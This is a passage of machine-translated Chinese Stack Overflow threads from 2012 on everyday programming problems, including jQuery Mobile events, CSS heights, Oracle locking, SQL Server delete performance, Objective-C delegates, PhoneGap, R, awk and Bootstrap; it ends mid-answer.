# jquery - Jquery Mobile 可折叠事件未触发

> ID：13845223
> 
> 赞同：0
> 
> 时间：2012-12-12T17:23:50.987
> 
> 标签：jquery, jquery-mobile

我想做类似的事情：[JQuery-Mobile collapsible expand/collapse event](https://stackoverflow.com/questions/8399882/jquery-mobile-collapsible-expand-collapse-event)

我无法让它工作！即使我复制代码并将其放入我的网站，点击可折叠后也没有任何反应。

```
<div data-role="page" id="test">
    <div data-role="collapsible" id="my-collaspible">
        <h3>My Title</h3>
        <p>My Body</p>
    </div>
</div> 
```

这是js代码：

```
$('#my-collaspible').bind('expand', function () {
  alert('Expanded');
}).bind('collapse', function () {
  alert('Collapsed');
}); 
```

有什么建议吗？我不知道问题可能出在哪里！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:42:05.380

这是前：http://jsfiddle.net/quangtuyn/s4k7d/

你可以检查agian

希望它对你有用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:31:49.987

是错字吗？“我的可折叠”？尝试将标记和 jquery 选择器中的 ID 更改为正确的拼写

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:38:44.273

也许你需要使用折叠事件

```
$("#my-collaspible").trigger("collapse"); 
```

并展开活动

```
$("#my-collaspible").trigger("expand"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-03-21T16:21:55.780

您需要找到 Jquery UI 绑定到的元素。

```
$("[data-role*='collapsible-set']").bind('expand', FixJQueryMobileUIFails)

function FixJQueryMobileUIFails(element) {
    StraightenColumnsforQueryUIHeaders(element);
    StraightenCornerNextToHeaderInLastTreeElement(element);
    RoundBottomCornerInLastTreeElement(element);
 } 
```

# javascript - 如果我设置最小高度和最大高度，哪个优先？

> ID：13845224
> 
> 赞同：10
> 
> 时间：2012-12-12T17:23:52.487
> 
> 标签：javascript, html, css

我有一个菜单，有 9 个项目。我希望按钮高度具有屏幕尺寸的 40 像素或 11%（屏幕的 1/9）。无论是最大的。

现在我有：

```
min-height:40px;
max-height:11%; 
```

它总是40px。即使我的屏幕尺寸比这更大。

我可以在css上实现还是必须使用javascript？

谢谢你。

**编辑**

[JSFiddle](http://jsfiddle.net/gArXZ/3/)为它。

@Jeffery Khan 是对的，这解决了它。我有一个不同的因素推动它。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T17:27:04.963

`min-height`通常是设置的任何东西的高度，除非某些东西导致它扩展通过该高度，例如 div 的内容。

尝试以下操作：

```
min-height:40px;
height:11%; 
```

# sql - 表上的锁定机制

> ID：13845228
> 
> 赞同：2
> 
> 时间：2012-12-12T17:23:58.817
> 
> 标签：sql, oracle, plsql, oracle11g, locking

我们有一个由Oracle 进程P1 访问的表TAB1（例如SID=123）。该过程需要动态 SQL 删除，然后是提交。

由 SID=123 发起的进程 P1 除了这个 TAB1 相关操作之外还包含许多操作。

设想：

*   SID=123 有效；P1 对 TAB1 施加了行独占锁（从查询locked_object 视图中获得）。

*   另一个 oracle 进程 P2 由 SID=124 启动（与 P1 完全相同的进程，但针对不同的数据输入集）在某个时间（例如，2-3 分钟）P1 启动之后。

*   SID=124 等待由 SID=123 发起的进程 P1 完成；P2 对 TAB1 施加了行独占锁（从查询locked_object 视图中获得）。

问题：

我认为 P2 的同一行级锁期望 P1 的行级锁“可以继续”。我们是否能够手动覆盖进程 P1 对 TAB1 施加的锁定（我希望这是可能的），并在其对 TAB1 的操作结束后释放锁定？这是否有助于减少 P2 现在在 TAB1 上等待整个 P1 结束的漫长等待？

任何建议将不胜感激。如果您需要更多信息，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T20:15:56.900

锁是在**事务**边界上释放的，而不是在**进程**边界上释放的。

简而言之，如果您希望 P1 立即释放锁，则 P1 必须在删除操作之后通过显式提交或回滚来结束当前事务。

当然，结束事务也会提交/回滚在前一次提交/回滚之后在同一会话中执行的其他操作。如果这是一个问题，您必须重新考虑业务逻辑。

等等，你写了“动态 SQL 删除后提交”......如果你的意思是“立即跟随”，那么行独占锁已经被立即释放。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T10:37:36.517

我实际上已经“避免了这种情况”，这意味着“这个答案不是解决方案”。
我为避免这种情况所做的一切：

1.  在 TAB1 中再添加一列，为每个进程放置一个唯一的标识号。
2.  使用此列仅删除与该特定进程对应的行。 *我相信这避免了进程 P1 和 P2 等待同一行。*

感谢@Codo、@a_horse_with_no_name、@Ben、@Justin Cave 和@colemar 在尝试根据上下文美化问题和支持方面提供的所有帮助。

@Justin Cave：我一直在考虑与您提出的相同解决方案，但如果我昨天看到这个，我就不必浪费时间了。无论如何，非常感谢您的支持。

# javascript - 为什么这个旋转横幅的导航按钮不起作用？

> ID：13845229
> 
> 赞同：0
> 
> 时间：2012-12-12T17:24:00.050
> 
> 标签：javascript, jquery, html, css

我有 3 张图片在主页上旋转。一次显示一个图像，图像下方有 3 个圆点表示是第一张、第二张还是第三张图像。

这些点应该是可点击的，但事实并非如此。

这是CSS：

```
.body, html {font-family: "HelveticaNeue-Light", "Helvetica Neue Light", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;font-weight:300;background:#fff; background: url('http://www.ayrturfandtrac.org/wp-content/uploads/2012/12/headerImage4.png');background-repeat:repeat-x;width:100%;  margin:0; padding:0; }

.container{
    margin:0;
    padding:0;
    width:100%;
    height:100%;

    background-color:#ffffff;
}

.header {max-height: 100px}

.logo img {width:90%; min-height: 65px; max-width:400px; margin:0.5% 2% 1% 7%; float:left;}

.recLogo img {max-height: 140px; margin:0.5% 2% 1% 7%; float:left;}

.headlineContainer {display:block; width:80%; margin:0; position:relative; right:25%; font-weight:bold;}
.headline {margin:0;}

.nav {width:55%; margin:3.2% 0 0 0; float:left; max-height:100px}

.nav ul {}

.nav li {display:inline; height:30px; float:left; list-style:none; margin: 0 4.43668% 0 0;font-weight:bold}

.menu li a {text-decoration:none; color:#000; font-family:helvetica, arial, sans-serif; font-weight:regular;}

.menu li a:hover {color:#FFF}

.menu {float:right; margin:0 5% 0 0}

.current_page_item a:visited {color:#fff;}

.white {background-color:#fff;  background:url('http://www.ayrturfandtrac.org/wp-content/uploads/2012/12/headerImage4.png'); background-repeat:no-repeat; width:100%}

.promos {clear:both; width:80%; display:block; padding:5% auto 0 auto; margin: 0 auto; background-color:#fff; position:relative;bottom:2em; z-index:-1}

.rslides_tabs a {
background:#fff !important;
border: 2px solid !important;
border-color:#cccccc !important;
z-index:9 !important;
}

.rslides_tabs .rslides_here a {
background: #EE7600 !important;
border: 2px solid !important;
border-color:#cccccc !important;
z-index:9 !important;
} 
```

该页面可以在[http://www.ayrturfandtrac.org/上看到](http://www.ayrturfandtrac.org/)

您对如何修复这三个按钮有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T20:46:07.347

您完全正确地认为`z-index: -1`类`.promos`导致了问题，因为它正在将幻灯片放映推到`.white`包含块后面并导致点击不注册。

您需要重新配置您的 html 和 css 设置方式，以便“标题”区域真正成为其自己的元素，其中包含您的红色背景和阴影以及徽标和导航，然后可以使用 z- 设置它本身索引高于幻灯片放映容器。这使幻灯片放映保持在正常的 z-index 上，并且只要您的标题与幻灯片放映的重叠不超过投影的大小，您的单击功能就应该可以使用它。

# php - 防止单击后退按钮后重新填充表单字段

> ID：13845231
> 
> 赞同：5
> 
> 时间：2012-12-12T17:24:04.027
> 
> 标签：php, html, browser-cache

我有一个表格。提交成功后，有服务器端重定向查看新条目。

**问题**：按下后退按钮后，所有输入仍然填充最后的值（它不会自动重新提交表单或显示“确认表单提交”提示）。这允许用户再次手动单击“提交”并非常轻松地提交重复条目，这是我想要避免的。请注意，这不是经典的“repost”问题，我们使用的是 post/redirect/get 模式。

表单中有 20 多个字段，从技术上讲，两个相同的条目*可能*是合法的，但我只想在用户按下后退按钮时清除这些字段。

这是我尝试过的：

**无缓存标头**

```
header('Cache-Control: must-revalidate, no-store, no-cache, private, max-age=0');
header('Pragma: no-cache');
header('Expires: Sat, 26 Jul 1997 05:00:00 GMT'); 
```

**无缓存元标记的组合**

```
<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" /> 
```

**使用 javascript 提交和重定向**

```
$('form').submit(function(){
    $.post($(this).attr('action'), $(this).serialize(), function(response){
        window.location = response.redirectUrl;
    });
}); 
```

**提交表单后“刷新”重定向**

```
header('refresh:0; url=view_entry'); 
```

**由会话数据触发的刷新**（这里有点骇人听闻......）

```
// psuedo PHP code for the "add" page
if ($_SESSION['submit']) {
    $_SESSION['submit'] = 0;
    redirect(current_url); // Cross fingers and hope this clears the form
}
if ($formValid and $saveEntry) {
    $_SESSION['submit'] = 1;
    redirect(next_url);
} 
```

这些都不起作用，在点击后退按钮后仍然会填充这些字段。最后一个选项实际上触发了“确认表单提交”提示，这不是我想要的，但至少好一点。

我应该提到这是在谷歌浏览器中。如果有帮助，可以使用 Codeigniter 和 jQuery。我只想在用户点击后退按钮后清除表单字段，然后发布成功的条目。我实际上不记得以前有过这个问题，而且我完全没有想法。这样做的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:39:14.977

一种快速简便的方法是在响应之后和重定向之前单独清除字段。

```
$('form').submit(function(){
    $.post($(this).attr('action'), $(this).serialize(), function(response){
        // HERE, clear the fields like...
        $("#field_id_1").val('');
        $("#field_id_2").val('');
        // THEN do the redirect
        window.location = response.redirectUrl;
    });
}); 
```

它可能不是最全面的解决方案，但由于您无论如何都使用 ajax 调用进行提交，因此没有理由不这样做。

# sql-server - 删除主键需要多长时间？

> ID：13845232
> 
> 赞同：4
> 
> 时间：2012-12-12T17:24:04.870
> 
> 标签：sql-server, performance, sql-server-2008-r2, sql-delete

画一个简单的表结构：

```
Table1        Table2
----------    ----------
ID<-------|   ID
Name      |-->Table1ID
              Name 
```

`Table1`有几百万行（例如 350 万行）。我通过主键发出删除：

```
DELETE FROM Table1 WHERE ID = 100; 
```

`Table2`引用`Table1`中没有行`ID = 100`，因此删除工作不会违反任何外键约束。

您希望删除需要多长时间？大约几毫秒？几百毫秒？一秒钟或更长时间？几秒钟？等等，假设机器没有陷入困境并且可以轻松处理请求。

现在，我遇到这种情况，这样的删除大约需要 700 毫秒。对我来说，这似乎太慢了。我很好奇我是否不在基地或其他人是否认为这太慢了，以及帮助加快速度的建议！

这是实际的执行计划：

![执行计划](../Images/7508c7a218d5e2502c6a90f427a0fb62.png)

（这里的 XML 执行计划：http: [//pastebin.com/q9hSMLi3](http://pastebin.com/q9hSMLi3)）

聚集索引删除 (81%) 命中聚集 PK、非聚集唯一索引和非聚集非唯一索引。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T18:41:29.550

问题是用于验证外键的聚集索引扫描。

当删除成功并且没有匹配的记录会导致违规时，则`table2`需要扫描所有记录。该表有 1,117,190 行，因此这是一项代价高昂的操作，绝对可以从索引中受益。

执行计划中显示的 10% 数字只是基于某些建模假设的估计。

整个计划的成本为`0.0369164`表 2 的扫描成本`0.0036199`为 ，其余的一切都占`0.0332965`. 但是请注意，对于聚集索引扫描运算符，Estimated CPU Cost is`1.22907`和 Estimated IO Cost is `10.7142`(totaling `11.94327`not `0.0369164`)。

这种差异的原因是扫描在反半连接运算符下，一旦找到匹配的行，扫描就会停止。估计的子树成本在建模假设下按比例缩小，这将在仅扫描很小比例的表后发生。

如果没有 FK 违规并且删除成功，则需要扫描整个表，因此使用未按比例缩小的数字会提供更多信息。

如果使用`11.94327`代表实际发生的完整扫描的运算符的成本重新计算百分比，则此扫描运算符显示为计划成本的 99.7% ( `11.94327 / (11.94327 + 0.0332965)`)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:27:08.240

如果所有被触摸的页面都在缓存中，那么 CPU 成本和日志写入的时间大约为 1 毫秒或更短。就 CPU 而言，客户端库开销实际上可能比服务器负载更多。

对于不在缓存中的每个页面，您可以期望在磁盘上进行 5-10 毫秒的磁盘寻道。粗略地说，您可以期望每个被触及的索引一次这样的访问`Table1`加上一次访问`Table2`以验证 FK。

执行计划明确地告诉您要执行哪些物理操作。

700 毫秒似乎很多（70 个索引？！）。请张贴实际执行计划。服务器被卸载并且没有因为锁而阻塞？

# objective-c - unsafe_unretained vs weak：setDelegate 期间崩溃

> ID：13845234
> 
> 赞同：2
> 
> 时间：2012-12-12T17:24:09.540
> 
> 标签：objective-c, cocoa

**我对unsafe_unretained**和**weak**关键字有一些疑问：读起来它们是完全一样的，唯一的区别是如果指向的对象被释放，**weak**将设置为 null。

*现在我在下面的代码，它在[instanceOfTheView setDelegate:self]*期间在点 [#2] 崩溃

 *但如果在 I4vMainView 声明 [#1] 我替换

```
@property (nonatomic, weak) id <I4vDraggingFileProt> delegate; 
```

和

```
@property (nonatomic, unsafe_unretained) id <I4vDraggingFileProt> delegate; 
```

它完美地工作。这种行为的原因是什么？谢谢

详细信息：使用 ARC 编译的目标 10.7。Xcode 4.5.2 。苹果 LLVM 4.1

在 I4vMainView 类中，我有：

```
//----------- I4vMainView.h --------
@protocol I4vDraggingFileProt <NSObject>
   -(void) anURLWasDeopped: (NSURL *) droppedUrl;
@end    

@interface I4vMainView : NSView <NSDraggingDestination>{
    NSImageCell *imageCell;
    NSImage * image;
}

@property (nonatomic, weak) id <I4vDraggingFileProt> delegate;  // [#1] 
```

在来电者中

```
//----------- I4vViewController.h --------
@class I4vMainView;

@protocol I4vDraggingFileProt <NSObject>
    -(void) anURLWasDeopped: (NSURL *) droppedUrl;
@end

@interface I4vViewController : NSViewController <I4vDraggingFileProt>{
    I4vMainView * mv;
}

-(void) anURLWasDeopped: (NSURL *) droppedUrl;

@end

//----------- I4vViewController.m --------
@implementation I4vViewController
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Initialization code here.
    }
    return self;
}

- (void)loadView{
    mv = [[I4vMainView alloc] init];
    [mv setDelegate:self];    // <-- [#2]
    [self setView:mv];       
}

-(void) anURLWasDeopped: (NSURL *) droppedUrl{
    // ...
}

@end 
```

**添加：**

代表声明为

```
@property (nonatomic, weak) id <I4vDraggingFileProt> delegate; 
```

我有这个错误

```
<I4vMainView: 0x10060bf40> objc[4773]: cannot form weak reference to instance (0x10061bf10) of class I4vViewController 
```

并且回溯彻底 _objc_trap <- objc_stroreWeak <- -[I4vMainView setDelegate:] <- [I4vViewController view]

![在此处输入图像描述](../Images/bad79fe42dfc908043a6b986d9683988.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T19:05:02.530

我找到了答案：正如[无法形成代表的弱属性](https://stackoverflow.com/questions/9193445/weak-property-for-delegate-cannot-be-formed)

> 您目前无法创建对以下类的实例的归零弱引用（强调我的）：
> 
> NSATSTypesetter、NSColorSpace、NSFont、NSFontManager、NSFontPanel、NSImage、NSMenuView、NSParagraphStyle、NSSimpleHorizo​​ntalTypesetter、NSTableCellView、NSTextView、NSViewController、NSWindow 和 NSWindowController。此外，在 OS X 中，AV Foundation 框架中没有类支持弱引用。
> 
> 对于声明的属性，你应该使用assign而不是weak；对于变量，您应该使用 __unsafe_unretained 而不是 __weak。
> 
> 此外，您不能从 ARC 下的 NSHashTable、NSMapTable 或 NSPointerArray 的实例创建弱引用。*

# iphone - 为什么我的 Web 视图失败委托不起作用？

> ID：13845236
> 
> 赞同：-2
> 
> 时间：2012-12-12T17:24:14.187
> 
> 标签：iphone, objective-c, ios, uiwebview

。H

```
IBOutlet UIWebView *webview; 
```

.m

```
- (void)viewDidLoad {
    [webview loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"http://blabla.com"]]];
}

- (void)webView:(UIWebView *)webViewfail didFailLoadWithError:(NSError *)error {
    if([webViewfail isEqual:webview]) {
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Connection Failed"
                                                        message:@"Check your Internet connection before refreshing."
                                                       delegate:self
                                              cancelButtonTitle:@"OK"
                                              otherButtonTitles:nil];
        [alert show];
    }
} 
```

我不知道我做错了什么，我试图让它出现但关闭互联网连接。任何提示或建议都会有所帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:49:56.567

检查这个：

*   确保包含引用方法的对象确实是 Web 视图的`delegate`.
*   给 web 视图的 url 请求一个非常短的`timeoutInterval`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:12:49.560

确保您已在界面构建器中连接了委托（如果您正在使用该委托）。您可以通过选择 Web 视图来执行此操作，并拖动（同时保持控制）到视图控制器/文件的所有者，然后选择委托（当您释放鼠标时会弹出）。

或者，您可以在 viewDidLoad 方法的代码中连接您的委托，如下所示：

```
[webView setDelegate:self] 
```

通过添加 .h 确保您的视图控制器符合 UIWebViewDelegate 协议

```
@interface MyViewController : UIViewController <UIWebViewDelegate> 
```

祝你好运 ：）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-20T06:49:44.723

也试试这个：

在你的 ViewController.h

```
@interface ViewController : UIViewController <UIWebViewDelegate> 
```

在 [super viewDidLoad] 下面的 ViewController.m 中添加：

```
self.webView.Delegate = self; 
```

# java - 尝试复制 Map 时抛出 NullPointerException

> ID：13845241
> 
> 赞同：-2
> 
> 时间：2012-12-12T17:24:36.307
> 
> 标签：java, map, nullpointerexception

我正在尝试创建一个 XML 元素对象并在构造过程中分配一些属性，但我不断收到 NullPointerException 抛出，代码如下：

```
public XML.Element newElement(String name, Map<String, String> attributes) {
  return new ElementImpl(name, attributes);
} 
```

打电话

```
public class ElementImpl implements XML.Element {
  private Map<String, String> attributes = new LinkedHashMap<String, String>();

  public ElementImpl(String name, Map<String, String> attributes) {
    ...
    this.attributes.putAll(attributes);
  } 
```

使用调试器单步执行，它显示“this”为空。谁能解释我要去哪里错了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:32:52.017

我建议您删除 putAll 方法并分配变量。这是构造函数，所以这是您第一次在此实例上放置数据。

另外，您确定在创建 LinkedList 时不会出现任何错误吗？至少我在 Java 中知道的类只能接受一个参数，而您添加两个。

```
public class ElementImpl implements XML.Element {
  private Map<String, String> attributes;

  public ElementImpl(String name, Map<String, String> attributes) {
    this.attributes = attributes;
  }
} 
```

改写这个。我认为它会起作用。

如果下面的评论是写的，那么你可以试试这个。

```
this.attributes = new LinkedHashMap(attributes); 
```

这样你就会得到你的副本。

# javascript - Android 4.0.4 上的 webkit 焦点行为

> ID：13845242
> 
> 赞同：1
> 
> 时间：2012-12-12T17:24:41.407
> 
> 标签：javascript, android, css, forms, webkit

我在 Android 4.0.4 上的 Webkit 534.30 中的一对输入字段上看到了一些奇怪的行为。在字段中获得焦点时，用户无法单击页面并隐藏键盘，即“卡在字段中”。它在 Chrome 和 Sony Xperia S 上的普通浏览器中运行良好，但在 Galaxy S2 上的普通 ICS 浏览器中运行良好。

是否有人知道此版本的 webkit 中输入焦点/模糊的已知问题，或者是否有比以下更好的方法来设置输入字段焦点：

该代码仅使用：

```
$('#input_id').blur(function ()
{
    // update some other parts of DOM
}); 
```

和

```
$('#input_id').focus(function ()
{
    $(this).val("");
}); 
```

有没有更好的方法来为移动浏览器做到这一点？这个问题似乎与 S2 上这个特定的 Android 版本无关。

我尝试使用 Adob​​e Edge Inspect 禁用所有 Javascript 和调试，但这并没有产生任何有用的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T15:32:41.960

这是由于输入字段中有非数字字符，其属性“类型”设置为“电话”。似乎 webkit 的特定版本真的宁愿你不这样做。

# android - LocalFileSystem 未在 Android 中定义 PhoneGap (Build)

> ID：13845244
> 
> 赞同：0
> 
> 时间：2012-12-12T17:24:45.680
> 
> 标签：android, cordova

我有以下代码：

```
function wait(){
    $(document).ready(function() {
        //alert("Dentro de ready");
        document.addEventListener("deviceready", init(), true);
    });
} 
```

其中“wait”是从 onload 事件调用的 Javascript 函数。我使用 onload 事件以及 $(document).ready 和 "deviceready" 事件来确保在我开始编码时加载每一件事情。

“init()”方法做了一些事情，然后调用以下方法：

```
function download_img(imgToDownload){
    var url = remote_url+imgToDownload; // image url
    alert("img url: "+url);     
    try{
    window.requestFileSystem(**LocalFileSystem**.PERSISTENT, 0, 
            function (fs) {
        var imagePath = fs.root.fullPath +"/"+ imgToDownload; // full file path
        var fileTransfer = new FileTransfer();
        fileTransfer.download(url, imagePath, 
            function (entry) {
            alert("OK: " + entry.fullPath); // entry is fileEntry object
            }, 
            function (error) {
                alert("download error source " + error.source);
            alert("download error target " + error.target);
            alert("upload error code" + error.code);
            alert("http_status"+error.http_status);
            }
        );
        }
    );
    }catch(err){
    alert(err.message);
    }
} 
```

我在哪里收到错误消息：“未定义 LocalFileSystem”。

我的 config.xml 是：

```
<?xml version="1.0" encoding="UTF-8" ?>
<widget xmlns = "http://www.w3.org/ns/widgets"
    xmlns:gap = "http://phonegap.com/ns/1.0"
    id        = "com.lamakun.mancomunidad"
    version   = "3.0.0">

<name>PhoneGap Build Application</name>

<description>
A simple PhoneGap Build application.
</description>

<author href="https://example.com" email="you@example.com">
Your Name
</author>
<preference name="phonegap-version" value="2.2.0" />

<access origin="http://www.mytests.es" subdomains="true"/>

</widget> 
```

万一我可以添加任何权限，即使我认为现在我拥有所有权限。谁能给我一个线索？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:04:25.603

它不是：

```
document.addEventListener("deviceready", init(), true); 
```

它应该是：

```
document.addEventListener("deviceready", init, true); 
```

init 之后的 () 在触发 deviceready 事件之前立即调用该函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-16T07:32:54.803

```
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> 
```

在 android 清单文件中写入这些行

# r - 循环遍历 R 中的数据框列表并应用 if else 函数

> ID：13845249
> 
> 赞同：6
> 
> 时间：2012-12-12T17:25:06.600
> 
> 标签：r

我有一个数据框列表，如果其他功能通过列表应用，我想申请

```
df1= data.frame(letter=LETTERS[1:5], res=runif(10), cens=rep(0:1,5))
df2= data.frame(letter=LETTERS[1:5], res=runif(10), cens=rep(0,5)) 
df3= data.frame(letter=LETTERS[1:5], res=runif(10), cens=rep(0:1,5))
df4= data.frame(letter=LETTERS[1:5], res=runif(10), cens=rep(0,5)) 

df.list=list(df1,df2,df3,df4)

reg.stats = function(var1){
  gm.reg=exp(mean(log(var1)))
  gsd.reg=exp(sd(log(var1)))
  return(c(gm.reg,gsd.reg))
  }

 other.stats = function(obs,cens){
 nondetects <- obs[cens==1]
 detects <- obs[cens== 0]
 gm.other=exp(mean(log(detects)))
 gsd.other=exp(sd(log(detects)))
 return(c(gm.other,gsd.other))
 } 
```

我想遍历每个 df，如果单个 df = 0（即 df2）中 cens 变量的总和，则应用 reg.stats 函数，否则应用 other.stats 函数。

在真实的数据集中，我有一个 50+ dfs 的列表，我过去所做的是手动挑选出所有 cens = 0 的 dfs 并使用 lapply 函数。没关系，但是如果我分离数据框并为每个列表使用单独的 lapply 然后合并结果，则顺序会更改，然后我需要重新排序结果。有没有更快、更清洁的方法来做到这一点？

```
 uncens.list = df.list[c(2,4)]
  uncens.res= lapply(uncens.list, function(i) reg.stats(i$res))

  cens.list = df.list[c(1,3)]
  cens.res.=lapply(cens.list,function(i) other.stats(i$res,i$cens)) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T17:34:39.613

它适用于`if`，`else`但不适用于后者，`ifelse`因为后者只会返回函数结果的第一个值：

```
lapply(df.list, function(i) if (sum(i$cens) == 0) reg.stats(i$res) 
                            else other.stats(i$res,i$cens)) 
```

结果：

```
[[1]]
[1] 0.402693 1.467128

[[2]]
[1] 0.3427096 2.4269668

[[3]]
[1] 0.3731172 1.8051164

[[4]]
[1] 0.3883753 2.0028039 
```

* * *

顺便说一句：不需要单独的功能。这一切都可以在一个命令中完成：

```
lapply(df.list, function(i) {detects <- log(i$res[i$cens == 0])
                             c(exp(mean(detects)), exp(sd(detects)))}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:42:57.257

你看过包裹：plyr吗？ [http://cran.r-project.org/web/packages/plyr/index.html](http://cran.r-project.org/web/packages/plyr/index.html)

具体来说，函数 llply?

如果您编写了一个包装函数来确定在给定 cens 值的情况下要调用哪个 stats 函数，那么您似乎可以使用包装函数调用 llply 。

# ios - 如何使用 UIActivityIndi cator 作为 iOS 的实时状态指示器？

> ID：13845252
> 
> 赞同：1
> 
> 时间：2012-12-12T17:25:13.577
> 
> 标签：ios, uiactivityindicatorview

]]我正在尝试为我的 iOS 应用程序构建一个 UIActivityIndi​​cator，以便它显示正在运行的某些进程的当前状态，并且轮子的每个四分之一部分将根据状态以不同的颜色突出显示。

我看到的所有教程都展示了如何构建一个在加载时旋转的活动指示器，而我需要指示器保持在屏幕上并显示状态。我需要指示器保持中空，只有圆周是彩色的。我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T23:49:50.960

核心图形。您必须创建一个继承自`UIView`并自己完成所有绘图的自定义类。您可能会覆盖 float 的 setter `(progress)`，这将更新显示（使用`[self setNeedsDisplay]`. 然后在 drawRect: 方法中，您将使用此类属性`progress`来确定在视图中绘制/填充的颜色和角度。查看MBProgressHud 的来源供参考：[MBProgressHUD](http://github.com/jdg/MBProgressHUD/blob/master/MBProgressHUD.m)

# asp.net-mvc - 如何使我的 WCF 代理 asp.net 会话依赖？

> ID：13845263
> 
> 赞同：0
> 
> 时间：2012-12-12T17:25:52.967
> 
> 标签：asp.net-mvc, wcf, iis

我有一个（手动编码的）WCF 代理层（即不是 ServiceReference），它处理所有客户端功能并为 WCF 应用程序（在 IIS 7 下提供服务）进行一些缓存。例如，我可以运行两个桌面客户端，每个客户端都有自己的代理，并且它们的缓存对象（其中一些是静态的或单例的）将独立运行，因为每个代理当然都在自己的进程中运行。

现在，我有一个 asp.net MVC 网站（不是我熟悉的技术），我想要同样的行为：当两个不同的客户端连接到 Web 服务器时，我想要两个不同的代理实例。我假设这与 asp.net 会话有关，但不知道下一步该去哪里连接 asp.net 会话和代理实例。有没有办法做到这一点？

换句话说，如何使asp.net下的IIS服务器使用WCF代理作为客户端，而不是将其视为服务器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T19:56:19.700

假设您可以重构您的代码，使您的代理是一个实例，您将能够使用类似以下内容在 ASP.NET 应用程序中访问它：

```
public class WcfProxy
{
    private WcfProxy(){}

    private static object _locker = new object();

    public static WcfProxy Instance
    {
        get
        {
            if (HttpContext.Current.Session != null)
            {
                if (HttpContext.Current.Session["ProxyInstance"] == null)
                {
                    lock (_locker)
                    {
                        if (HttpContext.Current.Session["ProxyInstance"] == null)
                        {
                            HttpContext.Current.Session["ProxyInstance"] = new WcfProxy();
                        }
                    }
                }
                return (WcfProxy) HttpContext.Current.Session["ProxyInstance"];
            }
        }
    }

    public void OpenChannel(){}
} 
```

请注意，这省略了锁定。用法：

```
WcfProxy.Instance.OpenChannel(); 
```

# shell - 在 awk 中设置 shell 变量并重用

> ID：13845264
> 
> 赞同：1
> 
> 时间：2012-12-12T17:25:53.470
> 
> 标签：shell, variables, awk

如何将 shell 变量传递给 awk，设置它，在同一行的另一个 awk 中使用它并打印它？

我想先将 0 美元（所有字段）保存到一个变量中，解析 6 美元（ABC 123456M123000） - 获取“12300”，对其进行范围检查，如果满足，则打印所有字段（0 美元）

第 1 部分：我正在尝试做：

```
line="hello"
java class .... | awk -F, -v '{line=$0}' | awk 'begin my range check code' | if(p>100) print $line } 
```

第 2 部分： $6="ABC 123456M123000" （我将解析的字符串）一旦我将所有字段存储到一个变量中，我可以使用以下方法解析 $6：

```
awk 'begin {FS=" "} { print $2; len=length($2); p=substr($2,8,len)+0 ; print len,p ; if(p>100) print $line }' 
```

但我的问题在第 1 部分：如何将 $0 存储到变量中，以便在检查完成后，我可以打印它们？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:36:03.420

目前尚不清楚为什么需要多次调用`awk`. 根据您的描述，您似乎只是想这样做：

```
... | awk -F, '{split( $6, f, "M" )} f[2] > min' min=100 
```

或者，如果您不能在 'M' 上拆分但需要使用 substr （或其他一些方法来提取所需的值）：

```
... | awk -F, '{ split( $6, f, " " )} 0+substr( f[2], 8 ) > min' min=100 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T00:07:27.240

使用外壳：

```
java ... | while IFS= read -r line ; do
    sixth=$(IFS=,; set -- $line; echo "$6")
    val=${sixth:11}
    (( $val > 100 )) && echo "$line"
done 
```

那里有一些 bash-isms。

# html - 在 Bootstrap 网格中动态更改列数

> ID：13845267
> 
> 赞同：4
> 
> 时间：2012-12-12T17:26:17.697
> 
> 标签：html, twitter-bootstrap

我正在尝试为桌面浏览器和平板电脑浏览器的其他布局设计布局。

我想在桌面浏览器中看到 3+9 列（侧边栏 3 列，内容 9 列），平板电脑中看到 12 列（仅内容）。我不需要平板电脑中的侧边栏，所以在这种情况下我需要显示液体含量（宽度 100%）

我编写了这段代码，它在桌面浏览器上运行良好，但是当我在平板浏览器中测试它时，我只看到 9 列。

谁能帮我？

谢谢

```
...
    <div class="row-fluid">
       <div class="span3 visible-desktop">
          <!-- Render Sidebar -->
       </div>
       <div class="span9">
          <!-- Render Content-->
       </div>
    </div>
... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:40:21.370

在你的 css 末尾尝试这样的事情：

```
